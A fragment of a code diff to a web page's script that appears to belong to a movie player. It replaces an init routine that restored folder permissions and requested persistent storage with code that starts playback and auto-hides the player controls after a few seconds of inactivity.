-            console.log('🚀 Init...');
-            updateStatusCard();
+        /* INIT */
+        loadMovie(0);
+        startPlayback();
+        updatePlayUI();
 
-            // Restore permission if saved
-            await restoreDirHandle();
-
-            // Request persistent storage
-            if (OPFS_SUPPORTED) {
-                try {
-                    const granted = await navigator.storage.persist();
-                    console.log('Persistent storage:', granted ? '✅' : '❌');
-                } catch (e) {}
-            }
+        let hideTimer = null;
+        function resetHideTimer() {
+            if (hideTimer) clearTimeout(hideTimer);
+            topBar.classList.remove('hide');
+            bottomControls.classList.remove('hide');
+            hideTimer = setTimeout(() => {
+                if (isPlaying) {
+                    topBar.classList.add('hide');
+                    bottomControls.classList.add('hide');
+                }
+            }, 3000);
         }
-
-        init();
+        document.addEventListener('mousemove', resetHideTimer);
+        document.addEventListener('touchstart', resetHideTimer);
+        resetHideTimer();
 
         console.log('✅ App ready');
     </script>
 </body>
+
 </html>
